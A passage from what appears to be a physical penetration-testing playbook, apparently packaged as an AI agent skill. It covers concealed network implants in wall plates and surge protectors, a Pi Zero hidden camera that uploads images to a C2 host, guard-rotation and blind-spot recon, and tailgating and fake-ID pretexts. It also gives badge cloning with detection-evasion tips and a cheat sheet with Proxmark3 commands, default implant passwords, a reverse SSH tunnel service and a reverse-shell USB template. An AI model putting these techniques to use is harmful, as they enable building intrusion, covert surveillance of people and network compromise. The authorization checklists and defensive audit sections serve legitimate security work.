# Procedure:
# 1. Cut the wall plate to fit the Pi Zero W inside
# 2. Drill small holes for the antenna (or use an internal antenna Pi)
# 3. Tape over the Pi's LEDs
# 4. Install the wall plate at the target location (REPLACING an existing jack
#    faceplate — leave the original jack functional so the change isn't noticed)
# 5. Verify WiFi range — internal antenna Pi Zero W is limited to ~20m

# Alternative: use a 3D-printed concealment that snaps into a single-gang box
# behind the standard wall plate
```

### 9.3 Surge protector concealment

```bash
# Build a surge protector concealment

# Materials:
#   - Cheap surge protector (6-outlet)
#   - Pi Zero W or similar implant
#   - USB charger (5V, 1A)
#   - Slim LiPo battery (optional, for runtime without AC power)

# Procedure:
# 1. Open the surge protector (typically screws on the back)
# 2. Remove 1-2 outlet sockets to make room for the implant
# 3. Wire the USB charger to the AC input (BE CAREFUL — AC is lethal)
# 4. Glue the implant and charger inside
# 5. Tape over LEDs
# 6. Reassemble
# 7. The surge protector still functions as a surge protector
# 8. Place at the target location (cubicle, lobby, server room)

# Alternative (safer): buy a commercial surge protector with a built-in USB
# charger, replace the USB charger with the implant
```

---

## 10. Hidden Cameras / Audio

### 10.1 Pi Zero W hidden camera build

```bash
# Hardware:
#   - Raspberry Pi Zero W
#   - Pi Camera V2 (or NoIR V2 for low-light)
#   - Slim LiPo battery (5000mAh for ~8h runtime)
#   - Optional: cellular modem (Huawei MS2131i-8 or similar) for off-grid uplink

# Step 1: Software setup
sudo apt install -y fswebcam
mkdir -p /home/pi/captures

cat > /home/pi/capture.sh <<'EOF'
#!/bin/bash
while true; do
  fswebcam -r 1280x720 --no-banner /home/pi/captures/$(date +%Y%m%d_%H%M%S).jpg
  sleep 60
done
EOF
chmod +x /home/pi/capture.sh

# Auto-start on boot
sudo crontab -e
#   @reboot /home/pi/capture.sh &

# Off-site upload (if WiFi or cellular uplink)
cat > /home/pi/upload.sh <<'EOF'
#!/bin/bash
while true; do
  for f in /home/pi/captures/*.jpg; do
    scp "$f" user@<c2>:/captures/ && rm "$f"
  done
  sleep 300
done
EOF
chmod +x /home/pi/upload.sh
#   Add to crontab too

# Step 2: Pre-engagement test
#   Run for 24 hours
#   Verify battery life; verify image quality; verify upload
#   Verify concealment (no visible lens, no visible antenna, no visible LED)

# Step 3: On-site deployment
#   - Place at a choke point: break room, elevator lobby, hallway corner
#   - Conceal: in a plant, on a bookshelf, behind a clock
#   - Document placement (photo) for retrieval at engagement end

# Step 4: Off-site monitoring
#   Cellular uplink: images stream to a cloud bucket
#   Operator reviews feed every 30 minutes for guard rounds

# Step 5: Retrieval
#   Document retrieval
#   Securely wipe the SD card
sudo shred -uvz /home/pi/captures/*
```

### 10.2 Commercial hidden cameras

```
Zetta / Blink / Wyze cameras:
- Small form factor
- WiFi enabled
- Cloud or local recording
- Some have IR for low-light (visible red glow)
- Battery-powered variants for short-term deployment

Use case: short-term (24-72 hour) situational awareness during engagement
Deployment: concealed in office clutter

Note: these cameras are visible to RF sweeps. For long-term deployment, use a
custom Pi Zero build with no commercial RF signature.
```

### 10.3 Audio recording — legal considerations

```
One-party consent states (US):
- Only one party to a conversation needs to consent to recording
- Includes: NY, TX, OH, GA, CO, WA, and ~35 other states

Two-party (all-party) consent states (US):
- All parties to a conversation must consent
- Includes: CA, FL, IL, MD, MA, MT, NV, NH, PA, WA, DE, HI, OR, etc.

Other jurisdictions:
- EU/GDPR: explicit consent required
- Canada: one-party consent
- Australia: varies by state

Rule: verify local law BEFORE recording. When in doubt, don't record.
The engagement report can rely on operator notes instead.
```

---

## 11. On-Site Engagement Ops — Recon, Building Map, Guard Rotation

### 11.1 Pre-engagement recon pack

```bash
cat > recon_pack.md <<'EOF'
# Recon Pack: <CLIENT>, <ADDRESS>
## Engagement window: <START> to <END>

## Building layout
- Main entrance: <location>, readers: <vendor>, cameras: <count>
- Loading dock: <location>, hours: <8am-4pm>, guard coverage: <yes/no>
- Side entrances: <list with locations>
- Emergency exits: <list with hardware type>

## Inferred badge vendor
- LinkedIn photo evidence: <url>  → vendor: <inferred>
- Job posting evidence: <url>  → vendor: <inferred>
- On-site confirmation (walk-by): <vendor>

## Camera coverage
- Vendor: <Axis / Hikvision / Dahua>
- Entrance: <placement, count>
- Loading dock: <placement, count>
- Blind spots identified: <list>

## Guard cadence
- Shift change: <8am, 4pm, 12am>
- Patrol route: <description>
- Response time observed (door-forced-open test): <N minutes>

## Employee behavior
- Tailgating observed at main entrance: <N events per 10 min>
- Smoking area: <location, popular times>
- After-hours activity: <cleaning crew 8-10pm, HVAC contractor Tuesdays>

## Prohibited areas
- HR office: <floor, entry>
- Executive suites: <floor, entry, dedicated elevator>
- Colocation cages: <floor, third-party controlled>

## Recommended entry vector
- Primary: tailgating pretext (HVAC contractor) at loading dock, 8-9am
- Fallback: HID Prox clone (if borrowed badge available)
- Last resort: lock pick (commercial pin-tumbler at side entrance)
EOF
```

### 11.2 Building map (sketch)

```
Produce a sketch with:

1. Perimeter outline (exterior walls)
2. Entry points (numbered): main entrance, loading dock, side entrances, emergency exits
3. Camera coverage (circles with field-of-view)
4. Badge readers (squares)
5. Guard stations (triangles)
6. Patrol routes (dashed lines)
7. Target areas (server room, executive floor, etc.)
8. Concealment opportunities for drop boxes (X marks)
9. Camera blind spots (highlighted zones)

Tool: draw it by hand on graph paper during walk-by, then digitize in Inkscape
```

### 11.3 Guard rotation log

```bash
cat > guard_log.md <<'EOF'
# Guard Rotation Log: <CLIENT>, <ADDRESS>
## Date: YYYY-MM-DD

## 08:00 — Shift change observed at front desk
   - Outgoing: 2 guards, uniforms
   - Incoming: 2 guards, uniforms
   - Hand-off duration: 5 minutes
   - Gap in coverage: NONE (overlap)

## 09:00 — Patrol #1 observed
   - Route: front desk → lobby → elevator bank → break room → back to front desk
   - Duration: 12 minutes
   - Patrol frequency: every 60 minutes

## 10:00 — Patrol #2 observed (same route, same duration)

## 12:00 — Lunch rotation
   - 1 guard leaves for lunch
   - 1 guard remains at front desk
   - Reduced coverage: 45 minutes

## 14:00 — Patrol #3 observed
   - Same route
   - Same duration

## 16:00 — Shift change
   - Similar to morning

## 18:00 — Reduced coverage begins (night shift skeleton crew)
   - 1 guard at front desk
   - Patrol frequency: every 90 minutes

## Recommendation
   - Best entry window: 12:00-12:45 (lunch) or 18:00-08:00 (night)
EOF
```

---

## 12. Social Engineering for Physical — Tailgating, Pretext, Badge Impersonation

### 12.1 Tailgating pretexts (lowest-risk first)

```
1. "Forgot my badge in the car" + follow an employee through a door
   - Risk: LOW (universal pretext)
   - Failure: employee challenges you → leave
   - Best at: smoking areas, loading docks, side entrances

2. Delivery driver (Amazon / FedEx / UPS / food delivery)
   - Risk: LOW (employees expect deliveries)
   - Failure: receptionist insists on signing in → pretext fails, leave
   - Props: clipboard, box, uniform (Amazon / FedEx shirts available online)

3. HVAC / IT contractor with a tool bag
   - Risk: LOW (matches observed after-hours contractors)
   - Failure: client staff ask for credentials → produce fake work order
   - Props: tool bag, hard hat, hi-vis vest, fake work order

4. New employee on first day
   - Risk: LOW (matches LinkedIn announcements)
   - Failure: receptionist expects you to check in → pretext fails
   - Props: laptop bag, employee handbook (visible)

5. Pizza delivery (classic)
   - Risk: LOW (employees will hold the door for pizza)
   - Failure: nobody ordered pizza → pretext fails
   - Props: pizza box (empty), receipt

6. Delivery person with hand truck
   - Risk: LOW (loading dock accepts deliveries)
   - Failure: dock worker insists on delivery paperwork → leave

7. Fire inspector / building inspector / health inspector
   - Risk: MEDIUM (implies authority, may be reported to client)
   - Failure: client staff ask for ID → pretext fails
   - Props: clipboard, hi-vis vest, fake ID
```

### 12.2 Wardrobe and props checklist

```
- Dress code matches client observations
  (suit if formal; khakis if casual; hi-vis + hard hat if facilities)

- Clipboard with:
  - Fake work order (contractor / delivery pretext)
  - Pen
  - Engagement authorization letter (HIDDEN — produced only if challenged by security)

- Tool bag (contractor pretext):
  - Empty tool bag (looks the part)
  - Lock picks hidden INSIDE the tool bag (NOT visible)

- Backpack:
  - Engagement laptop (off during pretext)
  - Proxmark3 / ESP-RFID-Tool / Walrus (concealed)
  - Drop boxes (concealed)
  - Hidden cameras (concealed)
  - Spare cloned badges

- NO visible badges or IDs that contradict the pretext
- NO exposed USB weapons or cameras
- Phone on silent, in pocket

- Body camera (if client consented to recording):
  - Concealed on body
  - Verified before entry
  - Time-synced to engagement timeline
```

### 12.3 Pretext script — 15-second greeting

```
(Adapt to chosen pretext)

Delivery driver:
"Hi, I have a delivery for [floor / person]."
(Wait for direction or follow-through)

HVAC contractor:
"Hi, I'm here for the HVAC inspection on [floor]. I checked in at reception."
(Wait for direction)

New employee:
"Hi, I'm [name], starting today in [department]. I'm supposed to meet [manager]."
(Wait for direction or follow-through)

Forgot badge:
(Hold up empty badge holder) "Damn, left my badge in the car."
(Wait for employee to hold the door; say "thanks")

If challenged:
- Initially: stay in character, repeat the pretext
- If challenged further: gracefully exit ("Oh, I'll just go check in at reception")
- If a guard or law enforcement intervenes: STOP, produce authorization letter, call client contact
- NEVER argue or escalate
```

### 12.4 Badge impersonation (vs badge cloning)

```
Badge impersonation: pretend your cloned / fake badge IS valid
- Carry the badge visibly (lanyard, belt clip)
- Tap confidently (don't fumble)
- If challenged: "Oh, it must not have read — let me try again"
- If still challenged: gracefully exit

Badge cloning: use a cloned badge to enter
- The badge is functionally identical to a valid badge
- Reader logs show a valid badge tap
- Employee is unaware their badge was cloned

When to use which:
- Cloning: when you have the source badge (e.g., insider cooperation)
- Impersonation: when you don't have a source badge and the reader doesn't validate
- Both: clone to a real badge, then impersonate as that employee
```

---

## 13. Exit Strategies and Evidence Handling

### 13.1 Exit checklist

```
[ ] All picked doors re-locked
[ ] All cloned badges returned to client OR securely destroyed
[ ] All hidden cameras retrieved (count: in vs out)
[ ] All drop boxes retrieved (Cloud C2 retired)
[ ] All USB weapons removed from workstations
[ ] All network implants retrieved
[ ] All concealment materials removed
[ ] No artifacts left at the engagement site
[ ] All operators accounted for
[ ] Exit via main entrance (badge tap or front desk sign-out)
[ ] Body camera footage downloaded and time-synced
[ ] Operator debrief scheduled within 24 hours
```

### 13.2 Evidence pack

```bash
mkdir -p evidence_pack/{photos,logs,footage,cloned_badges,timeline}

# Photos (before / after for each operation)
#   - Cloned badge: photo of original + photo of clone
#   - Picked lock: photo of door (before), photo of door (after)
#   - Drop box deployment: photo of location + photo of device
#   - USB weapon: photo of workstation + photo of device
#   - Hidden camera: photo of placement + photo of device

# Logs
#   - Proxmark3 session log (commands, outputs)
#   - Cloud C2 export (drop box activity)
#   - Nmap output (internal network scan)
#   - Reverse shell transcript

# Footage
#   - Body camera (operator POV)
#   - Hidden camera (deployed on-site)
#   - C2 session capture (USB weapon delivery)

# Cloned badges (digital photo only; physical badges returned or destroyed)

# Timeline
cat > evidence_pack/timeline/timeline.md <<'EOF'
# Engagement Timeline: <CLIENT>, <DATE>

## 08:15 — Pre-engagement recon (walk-by, public property)
## 09:00 — Operator briefing; verify authorization letters
## 09:30 — Tailgating entry via loading dock (operator A)
##         (Pretext: HVAC contractor; guard absent)
## 09:32 — Inside building, headed to target floor
## 09:40 — Drop-box deployed at conference room network jack
##         (LAN Turtle, serial #X; Cloud C2 confirmed online 09:41)
## 09:50 — Badge cloned from unattended desk (HID Prox; T5577 written)
## 10:15 — Server room door entered with cloned badge
## 10:30 — USB weapon deployed at workstation WS-007 (Bash Bunny, beacon live)
## 11:00 — Hidden camera deployed at break room
## 14:00 — Engagement objectives met
## 14:15 — Reversal: USB removed, drop-box retrieved, camera retrieved
## 14:20 — Exit via main entrance (badge tap)
## 14:30 — After-action team debrief
EOF
```

### 13.3 Chain-of-custody form

```bash
cat > evidence_pack/chain_of_custody.md <<'EOF'
# Chain of Custody: <CLIENT>, <DATE>

| Item | Description | Collected | Operator | Storage | Retention | Destroyed |
|------|-------------|-----------|----------|---------|-----------|-----------|
| 001  | Cloned HID Prox T5577 | 2026-06-17 09:50 | A | encrypted volume | 30 days | 2026-07-17 |
| 002  | LAN Turtle (retrieved) | 2026-06-17 14:15 | A | evidence safe | 30 days | n/a (returned to inventory) |
| 003  | Hidden camera SD card | 2026-06-17 14:15 | B | evidence safe | 30 days | 2026-07-17 |
| 004  | Bash Bunny (retrieved) | 2026-06-17 14:15 | A | evidence safe | 30 days | n/a |
| 005  | Operator bodycam footage | 2026-06-17 14:30 | A,B | encrypted volume | 30 days | 2026-07-17 |
| 006  | Proxmark3 session log | 2026-06-17 09:50 | A | encrypted volume | 30 days | 2026-07-17 |

## Custody transfers
- 2026-06-17 14:30: All items transferred from operators A,B to engagement lead
- 2026-06-18 10:00: Evidence pack delivered to client via secure channel

## Retention policy
- All evidence destroyed 30 days after engagement end
- Destruction documented in this form
- Client may extend retention by written request
EOF
```

### 13.4 Encrypt and deliver

```bash
# Encrypt the evidence pack
tar -czf evidence_pack.tar.gz evidence_pack/
gpg --symmetric --cipher-algo AES256 evidence_pack.tar.gz
#   Passphrase: shared with client out-of-band

# Remove the plaintext
shred -uvz evidence_pack.tar.gz

# Deliver evidence_pack.tar.gz.gpg to the client over an agreed secure channel:
#   - Encrypted email (PGP)
#   - Secure file share (Signal, ProtonMail Drive, encrypted S3)
#   - Hand-delivery on encrypted USB

# Document delivery in the chain-of-custody form
```

---

## 14. Physical Badge Audit / Defense Evasion

### 14.1 Defensive badge audit (when hired by the facility)

```bash
# Walk the facility with the client
# Document every deployed badge technology

cat > badge_audit.md <<'EOF'
# Badge System Audit: <CLIENT>
## Date: 2026-06-17

## Deployed technology
| Location | Reader vendor | Card technology | Cloning risk |
|----------|--------------|-----------------|--------------|
| Main entrance | HID iCLASS SE | Mifare DESFire EV2 | LOW |
| Server room | HID ProxPoint | HID Prox (LF) | CRITICAL |
| Loading dock | HID MiniProx | HID Prox (LF) | CRITICAL |
| Executive floor | HID iCLASS SE | HID iCLASS SE | LOW |

## Findings
1. CRITICAL: HID Prox 125 kHz deployed at server room and loading dock
   - No authentication; any reader can clone any card
   - Trivial clone in <30 seconds with Proxmark3 or ESP-RFID-Tool
2. CRITICAL: Mifare Classic 1K deployed at branch offices
   - CRYPTO1 broken since 2008
   - Trivial clone in <5 minutes with Proxmark3 or ACR122U + mfoc
3. POSITIVE: HID iCLASS SE / SEOS deployed at HQ
   - Mutual authentication
   - Clone-resistant

## Recommendations
1. Q3 2026: Migrate LF (HID Prox) to HID iCLASS SEOS
2. Q3 2026: Migrate HF (Mifare Classic) to Mifare DESFire EV3
3. Immediate: Enable anti-passback at all exterior doors
4. Immediate: Subscribe to duplicate-tap alerting
5. Quarterly: Badge audit
6. Annual: External physical pentest
EOF
```

### 14.2 Cloning without triggering detection

```
For red-team operators: cloning a badge without triggering the facility's
detection is the difference between a clean operation and getting caught.

Detection vectors to avoid:
1. Reader logs: a duplicate tap (same badge at two distant doors within
   impossible travel time) is the classic indicator. Mitigation:
   - Tap the cloned badge at a location consistent with the original's pattern
   - Avoid tapping at the same time as the original

2. Camera coverage: a person tapping a badge that doesn't match the badge's
   assigned employee is suspicious. Mitigation:
   - Time the tap to camera blind spots
   - Or: have the operator wear a hat / mask consistent with normal traffic

3. Anti-passback alarms: many systems alarm if a badge "in" without a prior
   "out." Mitigation:
   - Tap "in" only after the original badge has tapped "out"
   - Or: target readers with anti-passback disabled (typically interior doors)

4. Door-forced-open (DFO) alarms: if the door is opened without a badge tap,
   the system alarms. Mitigation:
   - Always tap the badge (don't just pull the door open after someone else)

5. Door-held-open (DHO) alarms: if the door is held for >30 seconds, the system
   alarms. Mitigation:
   - Don't hold doors for tailgaters
   - Or: time the entry to natural traffic patterns

6. Lock picking leaves no badge tap — so it doesn't trigger reader logs.
   But picking a door that requires a badge tap to open can trigger DFO.
   Mitigation:
   - Use picking on emergency exits (no badge tap expected) only with explicit scope
   - Or: pick interior doors that don't have badge readers
```

### 14.3 Anti-cloning controls (defensive)

```
For facility defenders: how to make cloning harder.

1. Migrate to mutual-authentication credentials
   - HID iCLASS SE / SEOS (13.56 MHz, mutual auth)
   - Mifare DESFire EV2 / EV3 (13.56 MHz, AES-128)
   - Mobile credentials (HID Mobile, Proxy, SwiftConnect)

2. Anti-passback enforcement
   - Force badge in/out at every door
   - Reject a second "in" tap without a prior "out"

3. Duplicate-tap alerting
   - Same badge at two distant doors within impossible travel time
   - Configure alerting in the access control system

4. Biometric layered with badge
   - Fingerprint, iris, or facial recognition at high-security doors
   - Cloned badge alone does not grant access

5. Guard response SLA
   - DFO and DHO alarms responded to in <5 minutes
   - Quarterly testing of the SLA

6. Reader tamper detection
   - Tamper switches on readers (alarms if reader is opened)
   - OSDP encrypted channel between reader and panel (vs unencrypted Wiegand)

7. Visitor management
   - Issue visitor badges with limited time/scope
   - Self-expiring badges (visual indicator after 24h)
   - Escort required for visitors

8. Tailgating detection
   - Cameras with people-counting at entry
   - Trained guards at reception
   - Turnstile entries for high-security areas
```

---

## 15. Cheat Sheet

### 15.1 Quick reference: badge cloning

```bash
# Proxmark3 — LF (125 kHz) HID Prox
pm3
pm3> lf search                # identify
pm3> lf hid read              # read
pm3> lf hid clone --fc 17 --cn 12345    # clone to T5577
pm3> lf hid sim --fc 17 --cn 12345      # simulate

# Proxmark3 — HF (13.56 MHz) Mifare Classic
pm3> hf search                # identify
pm3> hf mf autopwn            # recover keys
pm3> hf mf dump               # dump
pm3> hf mf cload --source hf-mf-XXXX-dump.bin    # clone to magic card

# Proxmark3 — HF HID iCLASS
pm3> hf search
pm3> hf iclass read --csn <csn> --key <standard_key>
pm3> hf iclass clone --csn <csn>

# ACR122U + mfoc — Mifare Classic
mfoc -O original.mfd -k 000000000000 -k FFFFFFFFFFFF -k A0A1A2A3A4A5
nfc-mfclassic W a original.mfd
```

### 15.2 Quick reference: drop boxes

```bash
# LAN Turtle
ssh root@<turtle_ip>           # default password: sh3llz
CONFIG SYSTEM C2 ADD URL=<claim_url>
PAYLOAD AUTOSHARK INSTALL

# Packet Squirrel (arming mode IP: 172.16.32.1)
ssh root@172.16.32.1           # default password: nuts
CONFIG SYSTEM C2 ADD URL=<claim_url>
PAYLOAD TCPDUMP INSTALL

# Pi Zero W reverse SSH
sudo apt install -y autossh
cat > /etc/systemd/system/reverse-tunnel.service <<'EOF'
[Unit]
Description=Reverse SSH tunnel to C2
After=network.target
[Service]
ExecStart=/usr/bin/autossh -M 0 -N -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -o "ExitOnForwardFailure yes" -R 2222:localhost:22 -i /home/pi/.ssh/id_ed25519 implant@<consultancy_c2>
Restart=always
User=pi
[Install]
WantedBy=multi-user.target
EOF
```

### 15.3 Quick reference: USB weapons

```bash
# Rubber Ducky
java -jar duckencode.jar -i payload.txt -o inject.bin
sudo dd if=inject.bin of=/dev/sdX bs=1M

# Bash Bunny
cp payload.txt /media/root/BashBunny/payloads/switch1/payload.txt

# P4wnP1
# Connect to WiFi "P4wnP1", browse to http://172.24.0.1:8000
# Templates > HID > Windows Reverse Shell
```

### 15.4 Quick reference: legal scope

```
ALWAYS:
[ ] Signed engagement contract
[ ] Rules of engagement (ROE) document
[ ] Authorization letter on client letterhead, signed by an officer
[ ] 24/7 client contact confirmed reachable
[ ] Local law verified for lock pick possession
[ ] Operator ID matches the authorization letter
[ ] Insurance confirmed

NEVER:
[ ] Enter without a signed authorization letter
[ ] Pick emergency exit locks (function keys)
[ ] Break glass or doors
[ ] Engage against minors
[ ] Enter third-party colocation cages
[ ] Leave decoy devices after the engagement
[ ] Record audio without verifying one-party / two-party consent law
```

### 15.5 Tool inventory (12 tools per metadata)

| # | Tool | Domain |
|---|------|--------|
| 1 | Proxmark3 | RFID/NFC cloning |
| 2 | ESP-RFID-Tool | RFID 125 kHz cloning |
| 3 | Walrus | NFC smartphone cloning |
| 4 | USB Rubber Ducky | Keystroke injection |
| 5 | Bash Bunny | Multi-vector USB weapon |
| 6 | P4wnP1 | DIY BadUSB (Pi Zero W) |
| 7 | Hak5 LAN Turtle | USB network implant |
| 8 | Hak5 Packet Squirrel | Ethernet inline implant |
| 9 | Lock pick set | Mechanical lock bypass |
| 10 | Bump keys | Pin-tumbler bumping |
| 11 | ACR122U + mfoc | Mifare Classic key recovery |
| 12 | Flipper Zero | Multi-tool entry (RFID/NFC/RF) |

### 15.6 Cross-references to adjacent skills

| Adjacent skill | Where to pivot |
|----------------|---------------|
| `bluetooth-rfid-nfc` | Protocol-level analysis of cloned credentials (CRYPTO1 weakness, Mifare nested attack internals) |
| `hardware-security` | Firmware extraction after drop-box deployment; JTAG/UART on captured devices |
| `sdr-rf-attack` | RF replay at 313 MHz/433 MHz for garage doors and gates |
| `social-engineering` | Phishing/vishing pretexts that complement physical tailgating |
| `post-exploitation` | Internal pivoting after drop-box deployment |
| `anti-forensics` | Minimizing footprint; reversing engagement artifacts |
| `ad-ldap-attack` | Active Directory attacks after physical-to-network pivot |
